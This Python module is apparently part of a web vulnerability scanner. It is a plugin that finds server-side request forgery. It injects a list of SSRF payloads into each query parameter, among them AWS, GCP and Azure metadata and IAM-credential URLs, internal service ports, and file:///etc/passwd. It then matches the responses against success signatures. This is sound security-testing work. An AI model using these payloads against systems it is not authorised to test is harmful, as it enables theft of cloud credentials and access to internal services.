"""
Enterprise SSRF Detection Plugin.

Emits DetectionCandidate objects for centralized verification.
"""
import re
import urllib.parse
import time
from typing import List, Union, Dict

import structlog

from ...interfaces.active import ActivePluginInterface
from ...passive.models import PluginMetadata
from ...network.http.manager import HTTPClientManager
from ...network.models import HTTPRequest, HTTPResponse
from ...models.finding import Finding, Evidence, VerificationStatus, Severity, Confidence
from ...crawler.models import Endpoint
from ..models import DetectionCandidate, BaselineResult, Payload, PayloadTechnique
from ..mutator import EnterpriseRequestMutator


logger = structlog.get_logger(__name__)

SSRF_PAYLOADS = [
    {"value": "http://169.254.169.254/latest/meta-data/", "category": "aws_metadata", "marker": r"ami-[a-f0-9]+|instance-id|security-credentials"},
    {"value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "category": "aws_iam", "marker": r"AccessKeyId|SecretAccessKey"},
    {"value": "http://metadata.google.internal/computeMetadata/v1/", "category": "gcp_metadata", "marker": r"computeMetadata/v1|Metadata-Flavor"},
    {"value": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "category": "azure_metadata", "marker": r"azEnvironment|compute/instance"},
    {"value": "http://localhost/", "category": "localhost", "marker": r"Apache2 Ubuntu Default Page|IIS Windows Server|Directory listing for /|Welcome to nginx!"},
    {"value": "http://127.0.0.1/", "category": "localhost_ipv4", "marker": r"Apache2 Ubuntu Default Page|IIS Windows Server|Directory listing for /|Welcome to nginx!"},
    {"value": "http://[::1]/", "category": "localhost_ipv6", "marker": r"Apache2 Ubuntu Default Page|IIS Windows Server|Directory listing for /|Welcome to nginx!"},
    {"value": "http://0.0.0.0/", "category": "zero_ip", "marker": r"Apache2 Ubuntu Default Page|IIS Windows Server|Directory listing for /|Welcome to nginx!"},
    {"value": "file:///etc/passwd", "category": "file_proto_linux", "marker": r"root:x:0:0:"},
    {"value": "file:///c:/windows/win.ini", "category": "file_proto_windows", "marker": r"\[extensions\]|\[fonts\]"},
    {"value": "dict://127.0.0.1:11211/stat", "category": "dict_memcached", "marker": r"STAT pid \d+|STAT uptime \d+"},
    {"value": "http://127.0.0.1:6379/", "category": "redis", "marker": r"REDIS\d+|redis_version:\d+"},
    {"value": "http://127.0.0.1:9200/", "category": "elasticsearch", "marker": r"cluster_name|elasticsearch"},
    {"value": "http://127.0.0.1:5432/", "category": "postgresql", "marker": r"PostgreSQL|FATAL|password"},
    {"value": "http://127.0.0.1:3306/", "category": "mysql", "marker": r"mysql|MariaDB"},
    {"value": "http://127.0.0.1:27017/", "category": "mongodb", "marker": r"MongoDB|mongo"},
]

class SSRFPlugin(ActivePluginInterface):
    """Enterprise SSRF detector emitting unverified candidates."""

    @property
    def metadata(self) -> PluginMetadata:
        return PluginMetadata(
            id="ACT-SSRF-001",
            name="Server-Side Request Forgery (SSRF)",
            description="Detects SSRF candidates for centralized verification.",
        )

    async def execute(self, endpoint: Union[str, Endpoint], http_manager: HTTPClientManager) -> List[DetectionCandidate]:
        candidates = []
        client = http_manager.get_shared_client()
        endpoint_url = endpoint.url if not isinstance(endpoint, str) else endpoint
        mutator = EnterpriseRequestMutator()

        params = self._get_params(endpoint)
        if not params: return candidates

        baseline = await self._capture_baseline(client, endpoint_url)
        baseline_text = baseline.response.text if baseline and baseline.response and isinstance(baseline.response.text, str) else ""

        vulnerable_params = set()

        for param_name in params:
            if param_name in vulnerable_params: continue

            for ssrf_def in SSRF_PAYLOADS:
                if param_name in vulnerable_params: break

                payload = Payload(
                    value=ssrf_def["value"],
                    technique=PayloadTechnique.PROTOCOL_ABUSE,
                    category="ssrf",
                    metadata={"ssrf_category": ssrf_def["category"]},
                )

                case = next((tc for tc in mutator.mutate(endpoint, [payload]) if tc.mutated_parameter == param_name), None)
                if not case: continue

                resp = await client.send(case.request)
                resp_text = resp.text if isinstance(resp.text, str) else ""

                if not re.search(ssrf_def["marker"], resp_text, re.IGNORECASE):
                    continue

                if re.search(ssrf_def["marker"], baseline_text, re.IGNORECASE):
                    continue

                candidate = DetectionCandidate(
                    plugin_id=self.metadata.id,
                    vulnerability_type="ssrf",
                    technique=PayloadTechnique.PROTOCOL_ABUSE,
                    endpoint=endpoint_url,
                    parameter=param_name,
                    payload=payload,
                    baseline=baseline,
                    fuzzed_request=case.request,
                    fuzzed_response=resp,
                    matched_signature=ssrf_def["marker"],
                    detection_evidence={"ssrf_category": ssrf_def["category"], "matched_marker": ssrf_def["marker"]},
                )
                candidates.append(candidate)
                vulnerable_params.add(param_name)

        return candidates

    def _get_params(self, endpoint: Union[str, Endpoint]) -> Dict[str, str]:
        if isinstance(endpoint, str):
            parsed = urllib.parse.urlparse(endpoint)
            return dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
        return endpoint.parameters or {}

    async def _capture_baseline(self, client, url: str) -> BaselineResult:
        try:
            req = HTTPRequest(method="GET", url=url)
            start = time.monotonic()
            resp = await client.send(req)
            elapsed = (time.monotonic() - start) * 1000
            return BaselineResult(request=req, response=resp, response_time_ms=elapsed)
        except Exception as e:
            return BaselineResult(request=HTTPRequest(method="GET", url=url), error=str(e))
